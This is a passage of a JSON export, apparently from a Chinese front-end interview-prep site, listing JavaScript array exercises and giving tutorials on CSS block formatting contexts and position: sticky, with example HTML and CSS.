8c-846d-9f076e2afae3\",\"c8997d09-6634-4e27-9f3f-5376a6e97f17\",\"fd0bb7e5-19a0-4473-8b07-4f0e385afd3c\",\"7a9f621a-416f-4c2b-8d08-8f8e0a113c6a\",\"bde6a595-899a-453a-85c4-0b774b75fb9e\",\"f53e39b7-9de1-4a49-b95d-6c73591d5512\",\"1648c493-456c-426e-b57f-7a24ad14d40e\",\"4af06e53-d9ca-4a28-8067-d4ffc3691827\",\"f56b93a9-52df-49ae-8d63-d7ee4f816f8b\",\"4b009a64-6d98-4469-89d4-9c254d682fa6\",\"4a0df14c-048b-47cc-a18f-1c9b36f54e90\",\"943c425e-0b59-4ef6-b22d-6596c19a962a\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 21,
    "createAt": "2024-11-08T14:39:47.000Z",
    "updateAt": "2024-11-08T14:41:40.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "068836c3-c6b3-4c4c-b24e-301357cf01c1",
        "title": "实现数组的flat方法，支持深度层级参数",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-08-23T05:25:17.000Z"
      },
      {
        "exerciseKey": "1648c493-456c-426e-b57f-7a24ad14d40e",
        "title": "什么是类数组对象？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-22T10:27:26.000Z",
        "updateAt": "2024-07-20T18:09:42.000Z"
      },
      {
        "exerciseKey": "17555ccc-83cf-4f7e-9834-8c1bb749e7d7",
        "title": "请对以下数组，根据 `born` 的值降序排列",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-08-07T14:47:19.000Z",
        "updateAt": "2023-03-03T20:25:56.000Z"
      },
      {
        "exerciseKey": "25a1d366-42f6-42e2-9a41-b6dd4624fd55",
        "title": "判断数组的方式有哪些？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-08-22T04:06:55.000Z"
      },
      {
        "exerciseKey": "30b5a8a5-5420-49cb-94b4-f45684eecba9",
        "title": "JS 中的数组和函数在内存中是如何存储的？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-08-22T11:04:42.000Z"
      },
      {
        "exerciseKey": "3414a818-1951-4db1-9595-9b16bb06a005",
        "title": "常见数组排序算法有哪些？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:45.000Z",
        "updateAt": "2024-08-14T12:12:51.000Z"
      },
      {
        "exerciseKey": "37b4752f-88bd-4959-8ff7-c081fdbc20cb",
        "title": "使用 js 实现有序数组原地去重",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-30T01:14:00.000Z",
        "updateAt": "2023-06-26T08:53:43.000Z"
      },
      {
        "exerciseKey": "4a0df14c-048b-47cc-a18f-1c9b36f54e90",
        "title": "ES6中数组新增了哪些扩展?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:35:15.000Z",
        "updateAt": "2024-07-22T15:41:11.000Z"
      },
      {
        "exerciseKey": "4af06e53-d9ca-4a28-8067-d4ffc3691827",
        "title": "类数组转化为数组",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T14:58:56.000Z",
        "updateAt": "2021-07-07T00:12:37.000Z"
      },
      {
        "exerciseKey": "4b009a64-6d98-4469-89d4-9c254d682fa6",
        "title": "Javscript数组的常用方法有哪些？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:45:09.000Z",
        "updateAt": "2024-07-20T18:39:25.000Z"
      },
      {
        "exerciseKey": "51b79c37-fdda-46fe-9c79-4f2ac7a09206",
        "title": "什么是伪数组（类数组）？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-10-31T03:15:39.000Z"
      },
      {
        "exerciseKey": "62546213-8ab6-473e-8b24-1e53e17ab9fb",
        "title": "实现一个方法，可以对两个数组的维数进行对比",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:22.000Z",
        "updateAt": "2024-09-10T11:30:41.000Z"
      },
      {
        "exerciseKey": "69360791-290f-44c8-ba87-6bfe7a5260ad",
        "title": "找出数组中重复的数字",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-12-30T01:41:21.000Z",
        "updateAt": "2023-03-12T17:10:20.000Z"
      },
      {
        "exerciseKey": "6cbf1c8b-1af1-41e4-a2c1-577021781057",
        "title": "给定两个数组，写一个方法来计算它们的交集？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-14T23:59:06.000Z"
      },
      {
        "exerciseKey": "746d796e-fd0c-44c7-b38f-00296bdfdde9",
        "title": "react 中，数组用useState做状态管理的时候，使用push，pop，splice等直接更改数组对象，会引起页面渲染吗？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-08-23T05:27:42.000Z"
      },
      {
        "exerciseKey": "78f23cb3-8ee7-4f02-a995-e74ce3ad3836",
        "title": "​arguments 这种类数组，如何遍历类数组？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-06-09T15:21:47.000Z",
        "updateAt": "2024-08-10T17:06:43.000Z"
      },
      {
        "exerciseKey": "7a9f621a-416f-4c2b-8d08-8f8e0a113c6a",
        "title": "js中数组是如何在内存中存储的？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-12-26T03:41:06.000Z",
        "updateAt": "2024-08-10T17:06:03.000Z"
      },
      {
        "exerciseKey": "8f4296bd-3a36-47d4-a13b-05b5b628c37e",
        "title": "使用正则表达式实现以下需求：筛选出数组中只包含大小写字母的字符串，并将结果转换成大写\n",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-10-10T12:42:18.000Z",
        "updateAt": "2023-04-23T20:15:09.000Z"
      },
      {
        "exerciseKey": "914e2cac-b426-467e-b61c-e0987031ea84",
        "title": "遍历数组的方式有哪些？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-07-03T05:12:32.000Z",
        "updateAt": "2024-08-10T17:06:46.000Z"
      },
      {
        "exerciseKey": "943c425e-0b59-4ef6-b22d-6596c19a962a",
        "title": "哪些方法修改了原数组?",
        "category": "Choice",
        "vipLimit": 0,
        "createAt": "2021-07-02T15:33:04.000Z",
        "updateAt": "2021-07-03T22:29:14.000Z"
      },
      {
        "exerciseKey": "9b464276-64d0-4c3b-b908-0b5e34da878b",
        "title": "数组中的reduce方法有用过吗，说说它的具体用途？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-12-17T09:56:40.000Z",
        "updateAt": "2024-07-19T09:23:47.000Z"
      },
      {
        "exerciseKey": "9ba9d7cb-840a-4910-8596-88c6349ead1e",
        "title": "数组里面有10万个数据，取第一个元素和第10万个元素的时间相差多少？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-15T13:58:44.000Z"
      },
      {
        "exerciseKey": "a34f9f1b-c1b6-4660-b851-0b610c18e66e",
        "title": "如果空数组调用reduce会发生什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-12-17T09:57:55.000Z",
        "updateAt": "2024-07-19T09:08:47.000Z"
      },
      {
        "exerciseKey": "a3ff14a6-c938-4cfc-b5a3-57cb201d92d7",
        "title": "不定长二维数组的全排列",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-15T13:39:03.000Z",
        "updateAt": "2023-05-23T09:29:02.000Z"
      },
      {
        "exerciseKey": "b828c477-4689-4a3d-ab51-e41d76bd62e2",
        "title": "实现一个将多维数组展示的方法\n",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-10-10T12:42:46.000Z",
        "updateAt": "2023-03-12T22:57:11.000Z"
      },
      {
        "exerciseKey": "bde6a595-899a-453a-85c4-0b774b75fb9e",
        "title": "寻找两个正序数组的中位数",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-11-08T11:07:27.000Z",
        "updateAt": "2021-11-18T20:39:28.000Z"
      },
      {
        "exerciseKey": "c51ba9d2-f3d9-4b38-8f33-f962fa4983ea",
        "title": "怎么把函数中的 arguments 转成数组？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-08-07T14:45:32.000Z",
        "updateAt": "2024-08-10T17:06:56.000Z"
      },
      {
        "exerciseKey": "c8997d09-6634-4e27-9f3f-5376a6e97f17",
        "title": "如何区分数组和对象？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-17T12:23:45.000Z",
        "updateAt": "2024-07-20T10:31:19.000Z"
      },
      {
        "exerciseKey": "cbdbe075-a81e-4c8b-a264-1ffb95a7ee49",
        "title": "将数组的length设置为0，取第一个元素会返回什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-05-11T14:38:05.000Z",
        "updateAt": "2022-05-11T22:38:11.000Z"
      },
      {
        "exerciseKey": "d50af40c-df41-4601-9935-c6aa3c89e3d7",
        "title": "Javascript 数组中有哪些方法可以改变自身，哪些不可以？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T23:14:16.000Z"
      },
      {
        "exerciseKey": "e1f26ce6-71ba-4f91-b9a6-42d732799863",
        "title": "合并两个有序数组",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-05-16T15:00:39.000Z",
        "updateAt": "2022-05-16T23:00:41.000Z"
      },
      {
        "exerciseKey": "e79d1df5-690b-428c-846d-9f076e2afae3",
        "title": "​const声明了数组，还能push元素吗，为什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-17T12:26:12.000Z",
        "updateAt": "2022-04-17T20:26:27.000Z"
      },
      {
        "exerciseKey": "f1502312-3ac7-4089-b306-f64c301b7dd4",
        "title": "怎么使用 Math.max、Math.min 获取数组中的最值？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-18T03:21:28.000Z",
        "updateAt": "2023-05-19T09:12:00.000Z"
      },
      {
        "exerciseKey": "f196bf54-110a-4440-896a-a678835bea83",
        "title": "数组中的第 k 大的数字",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-07-17T10:58:35.000Z",
        "updateAt": "2022-07-17T19:37:52.000Z"
      },
      {
        "exerciseKey": "f2523d23-7648-47b1-a1b0-f7a01fb92c64",
        "title": "实现一个方法，从某个数值数组中，获取最小正数（非零非负数）的索引值",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-04-27T11:34:29.000Z",
        "updateAt": "2023-04-28T10:32:55.000Z"
      },
      {
        "exerciseKey": "f53e39b7-9de1-4a49-b95d-6c73591d5512",
        "title": "js中如何判断一个值是否是数组类型？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T03:04:29.000Z",
        "updateAt": "2024-07-20T11:47:43.000Z"
      },
      {
        "exerciseKey": "f56b93a9-52df-49ae-8d63-d7ee4f816f8b",
        "title": "数组去重",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T14:57:47.000Z",
        "updateAt": "2021-07-07T00:12:34.000Z"
      },
      {
        "exerciseKey": "fd0bb7e5-19a0-4473-8b07-4f0e385afd3c",
        "title": "使用js生成1-10000的数组",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-12-26T03:47:33.000Z",
        "updateAt": "2021-12-26T22:26:05.000Z"
      }
    ]
  },
  "162": {
    "id": 162,
    "tagId": 11,
    "title": "BFC",
    "explanation": "`BFC` 是前端面试中经常会被问到的一个知识点，今天就来带大家深入了解下什么是 `BFC` 以及它的作用。\n\n## 文档流\n\n在介绍BFC之前，需要先给大家介绍一下文档流。\n\n我们常说的文档流其实分为`定位流`、`浮动流`、`普通流`三种。\n\n## 绝对定位(Absolute positioning)\n\n如果元素的属性 `position` 为 `absolute` 或 `fixed`，它就是一个绝对定位元素。\n\n在绝对定位布局中，元素会整体脱离普通流，因此绝对定位元素不会对其兄弟元素造成影响，而元素具体的位置由绝对定位的坐标决定。\n\n它的定位相对于它的包含块，相关CSS属性：`top`、`bottom`、`left`、`right`；\n\n对于 `position: absolute`，元素定位将相对于上级元素中最近的一个`relative、fixed、absolute`，如果没有则相对于body；\n\n对于 `position:fixed`，正常来说是相对于浏览器窗口定位的，但是当**元素祖先的 `transform` 属性非 `none` 时，会相对于该祖先进行定位**。\n\n## 浮动 (float)\n\n在浮动布局中，元素首先按照普通流的位置出现，然后根据浮动的方向尽可能的向左边或右边偏移，其效果与印刷排版中的文本环绕相似。\n\n## 普通流 (normal flow)\n\n普通流其实就是指BFC中的FC。FC(`Formatting Context`)，直译过来是格式化上下文，它是页面中的一块渲染区域，有一套渲染规则，决定了其子元素如何布局，以及和其他元素之间的关系和作用。\n\n在普通流中，元素按照其在 HTML 中的先后位置至上而下布局，在这个过程中，行内元素水平排列，直到当行被占满然后换行。块级元素则会被渲染为完整的一个新行。\n\n除非另外指定，否则所有元素默认都是普通流定位，也可以说，普通流中元素的位置由该元素在 HTML 文档中的位置决定。\n\n## BFC 概念\n\n先看下MDN上关于BFC的定义：\n\n> 块格式化上下文（`Block Formatting Context`，`BFC`） 是Web页面的可视CSS渲染的一部分，是块盒子的布局过程发生的区域，也是浮动元素与其他元素交互的区域。\n\n具有 `BFC` 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 `BFC` 具有普通容器所没有的一些特性。\n\n通俗一点来讲，可以把 `BFC` 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。\n\n除了 BFC，还有：\n\n* `IFC`（行级格式化上下文）- `inline` 内联\n* `GFC`（网格布局格式化上下文）- `display: grid`\n* `FFC`（自适应格式化上下文）- `display: flex`或`display: inline-flex`\n\n**注意**：同一个元素不能同时存在于两个 `BFC` 中。\n\n## BFC的触发方式\n\nMDN上对于[BFC的触发条件](https://developer.mozilla.org/zh-CN/docs/Web/Guide/CSS/Block_formatting_context)写的很多，总结一下常见的触发方式有（只需要满足一个条件即可触发 BFC 的特性）：\n\n* 根元素，即 `<html>`\n* 浮动元素：`float` 值为 `left` 、`right`\n* `overflow` 值不为 `visible`，即为 `auto`、`scroll`、`hidden`\n* `display` 值为 `inline-block`、`table-cell`、`table-caption`、`table`、`inline-table`、`flex`、`inline-flex`、`grid`、`inline-grid`\n* 绝对定位元素：`position` 值为 `absolute`、`fixed`\n\n## BFC的特性\n\n* BFC 是页面上的一个独立容器，容器里面的子元素不会影响外面的元素。\n* BFC 内部的块级盒会在垂直方向上一个接一个排列\n* 同一 BFC 下的相邻块级元素可能发生外边距折叠，创建新的 BFC 可以避免外边距折叠\n* 每个元素的外边距盒（`margin box`）的左边与包含块边框盒（`border box`）的左边相接触（从右向左的格式的话，则相反），即使存在浮动\n* 浮动盒的区域不会和 BFC 重叠\n* 计算 BFC 的高度时，浮动元素也会参与计算\n\n## 应用\n\nBFC是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面元素，反之亦然。我们可以利用BFC的这个特性来做很多事。\n\n### 自适应两列布局\n\n左列浮动（定宽或不定宽都可以），给右列开启 BFC。\n\n```html\n<div>\n    <div class=\"left\">浮动元素，无固定宽度</div>\n    <div class=\"right\">自适应</div>\n</div>\n```\n\n```css\n* {\n    margin: 0;\n    padding: 0;\n}\n.left {\n    float: left;\n    height: 200px;\n    margin-right: 10px;\n    background-color: red;\n}\n.right {\n    overflow: hidden;\n    height: 200px;\n    background-color: yellow;\n}\n```\n\n效果：\n![](https://static.ecool.fun//article/c504aad1-f0ef-4f87-a5e1-ed44017762c6.png)\n\n* 将左列设为左浮动，将自身高度塌陷，使得其它块级元素可以和它占据同一行的位置。\n* 右列为 div 块级元素，利用其自身的流特性占满整行。\n* 右列设置overflow: hidden,触发 BFC 特性，使其自身与左列的浮动元素隔离开，不占满整行。\n\n这即是上面说的 BFC 的特性之一：**浮动盒的区域不会和 BFC 重叠**\n\n### 防止外边距（margin）重叠\n\n兄弟元素之间的外边距重叠\n\n```html\n<div>\n    <div class=\"child1\"></div>\n    <div class=\"child2\"></div>\n</div>\n```\n\n```css\n* {\n    margin: 0;\n    padding: 0;\n}\n.child1 {\n    width: 100px;\n    height: 100px;\n    margin-bottom: 10px;\n    background-color: red;\n}\n.child2 {\n    width: 100px;\n    height: 100px;\n    margin-top: 20px;\n    background-color: green;\n}\n```\n\n效果：\n![](https://static.ecool.fun//article/760cc5b0-346b-4ea0-8ec4-780bcf4008c2.png)\n\n两个块级元素，红色 div 距离底部 10px，绿色 div 距离顶部 20px，按道理应该两个块级元素相距 30px 才对，但实际却是取距离较大的一个，即 20px。\n\n> 块级元素的上外边距和下外边距有时会合并（或折叠）为一个外边距，其大小取其中的较大者，这种行为称为外边距折叠（重叠），注意这个是发生在属于同一 BFC 下的块级元素之间\n\n根据 BFC 特性，创建一个新的 BFC 就不会发生 margin 折叠了。比如我们在他们两个 div 外层再包裹一层容器，加属性 `overflow: hidden`，触发 BFC，那么两个 div 就不属于同个 BFC 了。\n\n```html\n<div>\n    <div class=\"parent\">\n        <div class=\"child1\"></div>\n    </div>\n    <div class=\"parent\">\n        <div class=\"child2\"></div>\n    </div>\n</div>\n```\n\n```css\n.parent {\n    overflow: hidden;\n}\n\n/* ... */\n```\n\n![](https://static.ecool.fun//article/f245b981-524a-4699-abd3-008b7cb710e8.png)\n\n这个关于兄弟元素外边距叠加的问题，除了触发 BFC 也有其他方案，比如你统一只用上边距或下边距，就不会有上面的问题。\n\n### 父子元素的外边距重叠\n\n这种情况存在父元素与其第一个或最后一个子元素之间（嵌套元素）。\n\n如果在父元素与其第一个/最后一个子元素之间不存在边框、内边距、行内内容，也没有创建块格式化上下文、或者清除浮动将两者的外边距 分开，此时子元素的外边距会“溢出”到父元素的外面。\n\n```html\n<div id=\"parent\">\n  <div id=\"child\"></div>\n</div>\n```\n```css\n* {\n    margin: 0;\n    padding: 0;\n}\n#parent {\n    width: 200px;\n    height: 200px;\n    background-color: green;\n    margin-top: 20px;\n}\n#child {\n    width: 100px;\n    height: 100px;\n    background-color: red;\n    margin-top: 30px;\n}\n```\n\n![](https://static.ecool.fun//article/c98b3ee7-e321-4634-b517-796cd33b2874.png)\n\n如上图，红色的 div 在绿色的 div 内部，且设置了 `margin-top` 为 30px，但我们发现红色 div 的顶部与绿色 div 顶部重合，并没有距离顶部 30px，而是溢出到父元素的外面计算。即本来父元素距离顶部只有 20px，被子元素溢出影响，外边距重叠，取较大的值，则距离顶部 30px。\n\n解决办法：\n* 给父元素触发 BFC（如添加overflow: hidden）\n* 给父元素添加 border\n* 给父元素添加 padding\n\n这样就能实现我们期望的效果了：\n![](https://static.ecool.fun//article/4d83bb3f-a803-4484-b7b3-2905690cde06.png)\n\n### 清除浮动解决令父元素高度坍塌的问题\n\n当容器内子元素设置浮动时，脱离了文档流，容器中总父元素高度只有边框部分高度。\n\n```html\n<div class=\"parent\">\n  <div class=\"child\"></div>\n</div>\n```\n\n```css\n* {\n    margin: 0;\n    padding: 0;\n}\n.parent {\n    border: 4px solid red;\n}\n.child {\n    float: left;\n    width: 200px;\n    height: 200px;\n    background-color: blue;\n}\n```\n\n![](https://static.ecool.fun//article/5bf628eb-fea9-4fab-9b49-628c14680e7f.png)\n\n解决办法：给父元素触发 BFC，使其有 BFC 特性：**计算 BFC 的高度时，浮动元素也会参与计算** \n\n```css\n.parent {\n    overflow: hidden;\n    border: 4px solid red;\n}\n```\n\n![](https://static.ecool.fun//article/4b2faec3-6327-4f90-80ef-ecfa8a74cff2.png)\n\n上面我们都是用的 `overflow: hidden` 触发 BFC，因为确实常用，但是触发 BFC 也不止是只有这一种方法。\n\n如上面写的所示，可以设置`float: left;`，`float: right;`，`display: inline-block;`，`overflow: auto;`，`display: flex;`，`display: table;`，`position` 为 `absolute` 或 `fixed` 等等，这些都可以触发，不过父元素宽度表现不一定相同，但父元素高度都被撑出来了。\n\n当然实际运用可不是随便挑一个走，还是根据场景选择。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
    "testPoint": "### 1. **BFC 的概念**\n   - BFC 是什么？它在 CSS 布局中有什么作用？\n   - 如何解释 BFC 是一种独立的布局环境？它如何影响元素的布局？\n\n### 2. **触发 BFC 的条件**\n   - 请列出一些常见触发 BFC 的方式，并解释每种方式的用法。\n     - `float` 不为 `none`。\n     - `overflow` 不为 `visible`（常见于 `hidden`、`auto`、`scroll`）。\n     - `display` 为 `inline-block`、`flex`、`grid` 或 `table-cell`。\n     - `position` 为 `absolute` 或 `fixed`。\n   - 为什么这些属性会触发 BFC？\n\n### 3. **BFC 的特性**\n   - BFC 有哪些重要的布局特性？如何利用这些特性解决实际布局问题？\n     - **清除浮动**：BFC 能包含内部浮动元素，实现清除浮动效果。\n     - **防止外边距重叠**：BFC 可以阻止相邻元素的外边距发生重叠。\n     - **避免文字环绕**：当元素浮动时，BFC 可以避免与相邻内容发生环绕现象。\n\n### 4. **BFC 的应用场景**\n   - **清除浮动**：如何使用 BFC 来清除浮动？为什么比使用 `clearfix` 更简便？\n     - 示例：父元素 `overflow: hidden` 即可清除子元素的浮动。\n   - **防止外边距重叠**：如何利用 BFC 解决外边距折叠问题？\n     - 示例：在父元素中设置 `overflow: hidden`，防止子元素与父元素之间的外边距重叠。\n   - **实现多栏布局**：如何利用 BFC 实现两栏或多栏布局，使得浮动元素不会影响其他内容？\n\n### 5. **代码演示**\n   - 给出一段代码，要求面试者识别其中的 BFC 和它的作用。\n   - 示例问题：如何使用 BFC 实现一个固定宽度的侧边栏和一个自适应的内容区？\n     ```html\n     <div class=\"container\">\n       <div class=\"sidebar\">Sidebar</div>\n       <div class=\"content\">Content</div>\n     </div>\n     ```\n     ```css\n     .container {\n       overflow: hidden;\n     }\n     .sidebar {\n       float: left;\n       width: 200px;\n     }\n     .content {\n       margin-left: 200px;\n     }\n     ```\n   - 问题：在这个布局中，为什么 `overflow: hidden` 可以用于清除浮动？如何使 `.container` 包含 `.sidebar` 中的浮动？\n\n### 6. **BFC 与其他布局上下文的关系**\n   - BFC 与其他 CSS 格式化上下文（如 IFC、GFC、FFC）的区别是什么？\n   - 在什么情况下选择 BFC 而非 `position: absolute` 或 `display: flex` 来布局？\n\n### 7. **BFC 的实际应用**\n   - 请描述一个在项目中使用 BFC 的场景，以及它如何解决布局问题。\n   - 举例：在电商页面的商品展示区域，如何利用 BFC 来清除浮动并防止产品卡片之间的外边距重叠？\n\n### 8. **浏览器兼容性与性能问题**\n   - BFC 的各个触发方式在现代浏览器中是否完全兼容？\n   - BFC 是否会影响页面性能？在什么情况下不建议过度使用 BFC？\n\n### 9. **BFC 与外边距折叠**\n   - 如何解释外边距折叠（margin collapsing）？为什么 BFC 可以阻止外边距折叠？\n   - 示例：通过 BFC 使两个嵌套的块元素保持各自的外边距独立。\n",
    "exerciseKeyList": "[\"c740c88b-fe1b-426f-ab9c-23f43c7fe62d\",\"e87bce7c-af1c-41f3-ae56-142be0e3c999\",\"5c174882-c1e7-4c08-a71a-f4c991be552f\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 14,
    "createAt": "2024-11-09T03:04:17.000Z",
    "updateAt": "2024-11-18T01:54:24.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "5c174882-c1e7-4c08-a71a-f4c991be552f",
        "title": "什么是BFC？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T09:42:41.000Z",
        "updateAt": "2024-08-10T21:34:37.000Z"
      },
      {
        "exerciseKey": "c740c88b-fe1b-426f-ab9c-23f43c7fe62d",
        "title": "说下 css 中的 BFC、IFC、GFC 和 FFC 分别指什么？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-15T13:57:30.000Z"
      },
      {
        "exerciseKey": "e87bce7c-af1c-41f3-ae56-142be0e3c999",
        "title": "怎么触发BFC，BFC有什么应用场景？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-07-24T03:33:38.000Z",
        "updateAt": "2025-07-16T12:34:34.000Z"
      }
    ]
  },
  "163": {
    "id": 163,
    "tagId": 11,
    "title": "position: sticky",
    "explanation": "如果问，CSS 中 position 属性的取值有几个？大部分人的回答大概是\n`static`、`relative`、`absolute`、`fixed`，实际上MDN上还有一个 `sticky`。\n\n今天我们就来给大家介绍这个容易被忽视的position属性值 `sticky`。\n\n先来看看MDN上对于 `sticky` 的介绍：\n\n> 粘性定位元素（stickily positioned element）是计算后位置属性为 sticky 的元素。\n\n> 粘性定位可以被认为是相对定位和固定定位的混合。\n\n什么是结合两种定位功能于一体呢？\n\n> 元素在跨越特定阈值前为相对定位，之后为固定定位。\n\n也就是元素先按照普通文档流定位，然后相对于该元素在流中的 `flow root（BFC）`和 `containing block`（最近的块级祖先元素）定位。\n\n元素定位表现为在跨越特定阈值前为相对定位，之后为固定定位。\n\n这个特定阈值指的是 top、right、bottom 或 left 之一，换言之，指定 top、right、bottom 或 left 四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。\n\n## 示例\n\n上面的文字描述估计还是很难理解，看看下面这张 GIF 图，想想要实现的话，使用 `JS + CSS` 的方式该如何做：\n\n![](https://cloud.githubusercontent.com/assets/8554143/22967003/97af8828-f39f-11e6-82db-55405160eea3.gif)\n\n按照常规做法，大概是监听页面 `scroll` 事件，判断每一区块距离视口顶部距离，超过了则设定该区块 `position:fixed`，反之去掉。\n\n而使用 `position:sticky` ，则可以非常方便的实现：\n\n```html\n<div class=\"container\">\n    <div class=\"sticky-box\">内容1</div>\n    <div class=\"sticky-box\">内容2</div>\n    <div class=\"sticky-box\">内容3</div>\n    <div class=\"sticky-box\">内容4</div>\n</div>\n```\n\n```css\n.container {\n    background: #eee;\n    width: 600px;\n    height: 1000px;\n    margin: 0 auto;\n}\n\n.sticky-box {\n    position: sticky;\n    height: 60px;\n    margin-bottom: 30px;\n    background: #ff7300;\n    top: 0px;\n}\n\ndiv {\n    font-size: 30px;\n    text-align: center;\n    color: #fff;\n    line-height: 60px;\n}\n```\n\n看看上面的 CSS 代码，只是给每个内容区块加上\n\n```css\n{\n    position: -webkit-sticky;\n    position: sticky;\n    top: 0;\n}\n```\n\n就可以轻松实现了。\n\n简单描述下生效过程，因为设定的阈值是 `top:0` ，这个值表示当元素距离页面视口（Viewport，也就是fixed定位的参照）顶部距离大于 0px 时，元素以 relative 定位表现，而当元素距离页面视口小于 0px 时，元素表现为 fixed 定位，也就会固定在顶部。\n\n不理解可以再看看下面这两张示意图（top:20px 的情况）：\n\n距离页面顶部大于20px，表现为 `position:relative;`\n\n![](https://cloud.githubusercontent.com/assets/8554143/22968940/7dabb642-f3a7-11e6-8eba-e48cc56642dc.gif)\n\n距离页面顶部小于20px，表现为 `position:fixed;`\n\n![](https://cloud.githubusercontent.com/assets/8554143/22969004/c0cfee66-f3a7-11e6-995b-0b497360ca2b.gif)\n\n### 运用 position:sticky 实现头部导航栏固定\n\n运用 position:sticky 实现导航栏固定，也是最常见的用法：\n\n![](https://cloud.githubusercontent.com/assets/8554143/22968496/9a4707d6-f3a5-11e6-82b2-2e6c5f95a706.gif)\n\n```html\n<div class=\"container\">\n    <nav>我是导航栏</nav>\n    <div class=\"content\">\n        <p>我是内容栏</p>\n        <p>我是内容栏</p>\n        <p>我是内容栏</p>\n        <p>我是内容栏</p>\n        <p>我是内容栏</p>\n        <p>我是内容栏</p>\n        <p>我是内容栏</p>\n        <p>我是内容栏</p>\n    </div>\n</div>\n```\n\n```css\n.container {\n    background: #eee;\n    width: 600px;\n    height: 1000px;\n    margin: 0 auto;\n}\n\nnav {\n    position: -webkit-sticky;\n    position: sticky;\n    top:0;\n\n}\n\nnav {\n    height: 50px;\n    background: #999;\n    color: #fff;\n    font-size: 30px;\n    line-height: 50px;\n}\n\n.content {\n    margin-top: 30px;\n    background: #ddd;\n}\n\np {\n    line-height: 40px;\n    font-size: 20px;\n}\n```\n\n同理，也可以实现侧边导航栏的超出固定。\n\n## 生效规则\n\n`position:sticky` 的生效是有一定的限制的，总结如下：\n\n* 须指定 `top, right, bottom 或 left` 四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。\n* top 和 bottom 同时设置时，top 生效的优先级高，left 和 right 同时设置时，left 的优先级高。\n* 设定为 `position:sticky` 元素的任意父节点的 `overflow` 属性必须是 `visible`，否则 `position:sticky` 不会生效。这里需要解释一下：\n  * 如果 `position:sticky` 元素的任意父节点定位设置为 overflow:hidden，则父容器无法进行滚动，所以 `position:sticky` 元素也不会有滚动然后固定的情况。\n  * 如果 `position:sticky` 元素的任意父节点定位设置为 `position:relative | absolute | fixed`，则元素相对父元素进行定位，而不会相对 `viewprot` 定位。\n* 达到设定的阀值。这个还算好理解，也就是设定了 `position:sticky` 的元素表现为 relative 还是 fixed 是根据元素是否达到设定了的阈值决定的。\n\n\n## 兼容性\n\n![](https://files.mdnice.com/user/27807/026e14da-8f68-4a44-ac38-82cc5f0ce24c.png)\n\n从上面的兼容性可以看到，在主流的浏览器中已经可以正常使用。",
